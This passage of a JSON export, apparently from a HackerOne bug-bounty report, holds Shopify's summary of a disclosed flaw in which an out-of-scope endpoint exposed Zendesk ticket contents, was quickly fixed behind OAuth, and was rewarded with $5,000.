accurate\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-19T16:34:06.293Z","updated_at":"2018-09-19T16:34:06.293Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":10619,"category":"team","content":"@rijalrojan discovered an application and endpoint under `athena-flex-production.shopifycloud.com `that exposed metadata and contents of our Zendesk tickets. Within a couple hours, we had put it behind an OAuth portal to mitigate the issue. After an internal investigation revealed no evidence of malicious access to the data, we rewarded him with the highest bounty available under our non-core authentication bypass category ($5,000). We did this despite the app being out of scope because of the severity of the information disclosure. As always, out-of-scope rewards are at our sole discretion.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003e\u003ca href=\"/rijalrojan\"\u003e@rijalrojan\u003c/a\u003e discovered an application and endpoint under \u003ccode\u003eathena-flex-production.shopifycloud.com\u003c/code\u003ethat exposed metadata and contents of our Zendesk tickets. Within a couple hours, we had put it behind an OAuth portal to mitigate the issue. After an internal investigation revealed no evidence of malicious access to the data, we rewarded him with the highest bounty available under our non-core authentication bypass category ($5,000). We did this despite the app being out of scope because of the severity of the information disclosure. As always, out-of-scope rewards are at our sole discretion.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}